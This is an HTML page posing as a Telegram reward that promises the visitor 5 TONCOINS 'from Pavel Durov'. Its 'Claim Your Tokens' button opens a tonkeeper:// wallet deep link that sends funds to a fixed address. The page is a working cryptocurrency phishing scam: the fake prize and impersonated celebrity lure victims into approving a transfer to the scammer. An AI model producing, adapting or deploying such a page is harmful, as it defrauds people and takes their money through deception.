<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Tokens</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f1f1f1;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            text-align: center;
            padding: 40px;
            background-color: #1a1a2e;
            border-radius: 15px;
            box-shadow: 0 0 30px rgba(0, 255, 255, 0.6);
            color: white;
            width: 100%;
            max-width: 400px;
            position: relative;
            overflow: hidden;
        }

        h1 {
            font-size: 36px;
            color: #f8a5c2;
            margin-bottom: 20px;
            text-transform: uppercase;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.6);
        }

        p {
            font-size: 18px;
            color: #fff;
            margin-bottom: 20px;
        }

        .confetti {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 10;
            background-image: url('https://cdn.pixabay.com/photo/2017/08/30/02/22/balloons-2695557_960_720.png');
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
            animation: confetti-fall 2s infinite linear;
        }

        @keyframes confetti-fall {
            0% {
                transform: translateY(-100%);
            }
            100% {
                transform: translateY(100%);
            }
        }

        button {
            background-color: #ff6347;
            color: white;
            padding: 20px 30px;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-size: 20px;
            transition: background-color 0.3s ease;
            margin-top: 20px;
        }

        button:hover {
            background-color: #ff8566;
        }

        .award {
            font-size: 20px;
            color: #ffeb3b;
            background-color: #ff5722;
            padding: 10px 20px;
            border-radius: 50px;
            margin-top: 30px;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.8);
            display: inline-block;
        }

        .highlight {
            color: #00e5ff;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="confetti"></div>
        <h1>Congratulations!</h1>
        <p>?? You are a winner! ??</p>
        <p>Due to your amazing activity in Telegram, you've earned <span class="highlight">5 TONCOINS</span>!</p>
        <p class="award">This gift is from <span class="highlight">Pavel Durov</span> himself as a token of appreciation. ??</p>
        <p>Click the button below to claim your reward and start your journey with TONCOINS!</p>
        <button onclick="window.location.href='tonkeeper://send?address=UQBGPcjpLyLOkCjdMt2mw-f1adTJZZTV4AOwM90edhSRjjN3&amount=200'">
            Claim Your Tokens
        </button>
    </div>
</body>
</html>
